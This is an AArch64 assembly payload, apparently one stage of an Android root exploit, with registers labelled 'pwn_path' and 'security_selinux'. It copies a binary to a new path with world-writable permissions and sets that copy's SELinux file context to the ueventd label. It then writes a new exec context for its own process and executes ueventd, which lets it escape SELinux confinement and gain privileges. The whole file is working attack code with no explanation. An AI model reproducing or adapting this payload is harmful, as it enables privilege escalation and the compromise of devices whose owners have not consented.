.include "libselinux.inc"

_start:
    mov x19, x0 // pwn_path
    mov x20, x1 // pwn_path_dest
    mov x21, x2 // security_selinux
    mov x22, x3 // ueventd_file_context
    mov x23, x4 // self_exec
    mov x24, x5 // ueventd_context
    mov x25, x6 // ueventd

    sub sp, sp, 1, lsl 12

    mov x0, -0x64
    mov x1, x19
    mov x2, O_RDONLY
    mov w3, 0x1b6
    mov w8, SYS_openat
    svc 0
    sxtw x9, w0

    mov x0, -0x64
    mov x1, x20
    mov w2, O_RDWR | O_CREAT
    mov w3, 0777
    mov w8, SYS_openat
    svc 0

_6a0:
    mov x10, x0
    mov x0, x9
    mov x1, sp
    mov w2, 0x1000
    mov w8, SYS_read
    svc 0

    cmp x0, 1
    sxtw x10, w10
    b.lt _724
    mov x2, x0
    mov x1, sp
    orr x11, xzr, 0xffffffff00000000

_6d0:
    mov x0, x10
    mov w8, SYS_write
    svc 0

    lsl x8, x0, 0x20
    sxtw x12, w0
    cmp x8, x11
    csel x8, x12, xzr, gt
    add x13, x1, x12
    sub x2, x2, x8
    csel x1, x13, x1, gt
    cmp x2, 0
    b.gt _6d0

    mov x0, x9
    mov x1, sp
    mov w2, 0x1000
    mov w8, SYS_read
    svc 0
    mov x2, x0
    cmp x0, 1
    mov x1, sp
    b.ge _6d0

_724:
    mov x0, x9
    mov w8, SYS_close
    svc 0
    mov x0, x10
    mov w8, 0x39
    svc 0

    mov x0, x20
    mov x1, x21
    mov x2, x22
    mov x3, 29
    mov x4, xzr
    mov x8, SYS_setxattr
    svc 0

    mov x0, xzr
    mov x1, x23
    mov x2, O_RDWR
    mov x3, xzr
    mov x8, SYS_openat
    svc 0

    mov x1, x24
    mov x2, 14
    mov x8, SYS_write
    svc 0

    mov x0, x25
    sub x1, sp, 16
    str x0, [x1]
    str xzr, [x1, 8]
    mov x2, xzr
    mov x8, SYS_execve
    svc 0

    mov x0, xzr
    mov x8, SYS_exit
    svc 0
    ret
